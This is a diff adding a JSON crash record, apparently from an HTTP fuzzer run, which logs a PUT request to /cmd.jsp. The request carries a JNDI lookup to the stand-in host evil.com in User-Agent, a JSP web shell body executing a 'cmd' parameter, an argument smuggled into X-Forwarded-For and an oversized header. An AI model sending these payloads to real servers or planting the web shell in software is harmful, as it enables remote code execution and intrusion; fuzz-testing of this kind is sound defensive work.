@@ -1,0 +1,25 @@
+{
+  "timestamp": "2025-12-29T14:40:01.059390",
+  "crash_type": "server_crash",
+  "payload": "PUT /cmd.jsp?\nHeaders: {'User-Agent': '${jndi:ldap://evil.com/exploit}', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'X-Forwarded-Host': 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB', 'Content-Type': 'http://127.0.0.1', 'X-Forwarded-For': '-d allow_url_include=1', 'Content-Range': 'bytes 0-100/101', 'Content-Length': '59'}\nBody: <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "payload_hash": "28e4d014ececc70a",
+  "request_method": "PUT",
+  "request_path": "/cmd.jsp?",
+  "request_headers": {
+    "User-Agent": "${jndi:ldap://evil.com/exploit}",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "X-Forwarded-Host": "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
+    "Content-Type": "http://127.0.0.1",
+    "X-Forwarded-For": "-d allow_url_include=1",
+    "Content-Range": "bytes 0-100/101",
+    "Content-Length": "59"
+  },
+  "request_body": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "error_message": "Simulated server_crash",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 183
+}
